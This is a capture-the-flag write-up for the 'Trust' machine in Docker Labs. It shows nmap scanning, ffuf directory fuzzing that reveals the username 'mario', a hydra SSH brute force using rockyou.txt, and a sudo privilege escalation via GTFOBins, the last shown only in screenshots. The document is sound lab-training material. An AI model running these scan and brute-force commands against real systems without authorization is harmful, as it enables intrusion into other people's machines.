---
{"dg-publish":true,"permalink":"/write-ups/docker-labs/trust/","tags":["CTF","write-up"]}
---


![Pasted image 20241214091106.png|200](/img/user/attachments/Pasted%20image%2020241214091106.png)

---

> [!INFO] Info about Trust
>  Get a root shell
>  Difficulty: Very Easy

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Linux, Debain
## Port 22 - SSH
tcp open  ssh     **OpenSSH 9.2p1** Debian 2+deb12u2 (protocol 2.0)
## Port 80 - Apache
tcp open  http    **Apache** httpd **2.4.57** ((Debian))
![Pasted image 20241214091920.png](/img/user/attachments/Pasted%20image%2020241214091920.png)
### Fuzz
```shell
ffuf -c -t 100 -u http://<TARGET>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -mc all -fc 404 -e .php,.html,.txt
```
One interesting subdirectory
![Pasted image 20241214092426.png|700](/img/user/attachments/Pasted%20image%2020241214092426.png)
### secret
![Pasted image 20241214095948.png|500](/img/user/attachments/Pasted%20image%2020241214095948.png)
We can get a username

---
# Exploitation
## SSH Brute force
Using the username found try brute force against *SSH*
```shell
hydra -f -V -t 64 -l mario -P /usr/share/wordlists/rockyou.txt 172.20.0.2 ssh 
```
![Pasted image 20241214095919.png](/img/user/attachments/Pasted%20image%2020241214095919.png)
Login to SSH 

---
# Privilege escalation
Check *sudo -l*, if we can execute some command as *root* user
Indeed, we can.
![Pasted image 20241214100311.png](/img/user/attachments/Pasted%20image%2020241214100311.png)

Use *gtfobins* to leverage it.
![Pasted image 20241214100418.png|400](/img/user/attachments/Pasted%20image%2020241214100418.png)

![Pasted image 20241214100605.png](/img/user/attachments/Pasted%20image%2020241214100605.png)

---
